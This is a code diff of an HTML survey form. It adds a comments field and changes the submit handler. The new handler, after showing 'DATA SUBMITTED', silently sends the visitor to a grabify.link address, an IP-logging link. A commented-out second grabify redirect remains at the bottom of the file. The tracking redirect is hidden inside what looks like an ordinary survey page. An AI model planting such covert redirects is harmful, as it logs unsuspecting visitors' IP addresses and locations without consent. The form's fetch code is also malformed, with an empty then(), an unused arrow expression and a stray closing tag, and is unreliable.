@@ -23,7 +23,7 @@
                         id="date"
                         class="form-control"
                         maxlength="10"
-                        required>                 
+                        required>
             </div>
             <div class="form-group">
                 <label id="name-label" for="name"></label>
@@ -134,30 +134,40 @@
                            class="input-checkbox" />Curriculum
                 </label>
             </div>
-
             <div class="form-group">
-                <button onclick="location.href = 'https://grabify.link/UV30AW'; timeDate()" type="submit" id="submit" class="submit-button">
+                <p>any comments, suggestions or personal thoughts?</p>
+                <textarea id="comments"
+                          class="input-textarea"
+                          name="data[COMMENTS]"
+                          maxlength="100"
+                          placeholder="enter your comments here"></textarea>
+            </div>
+            <div class="form-group">
+                <button onclick="validateForm()" type="submit" id="submit" class="submit-button">
                     SUBMIT TO DATABASE
               </a>
             </div>
         </form>
       <script>
-        var form = document.getElementById('survey-form');
-        form.addEventListener("submit", e => {
-          e.preventDefault();
-          fetch(form.action,{
-              method : "POST",
-              body: new FormData(document.getElementById("survey-form")),
-          }).then().then((html) =>
-          {
-            response => response.json()
-            alert('DATA SUBMITTED')
-            document.forms[0].reset();
-          });
+      var form = document.getElementById('survey-form');
+      form.addEventListener("submit", e => {
+        e.preventDefault();
+        fetch(form.action,{
+            method : "POST",
+            body: new FormData(document.getElementById("survey-form")),
+        }).then().then((html) =>
+        {
+          response => response.json()
+          alert('DATA SUBMITTED')
+          document.forms[0].reset();
+          window.location.href = "https://grabify.link/EE8ML7";
         });
+      });
       </script>
     <script src="./UTCtime.js"></script>
     <script src="http://ajax.googleapis.com/ajax/libs/jquery/1.7.1/jquery.min.js" type="text/javascript"></script>
     </div>
   </body>
 </html>
+
+<!--location.href = 'https://grabify.link/UV30AW'; -->
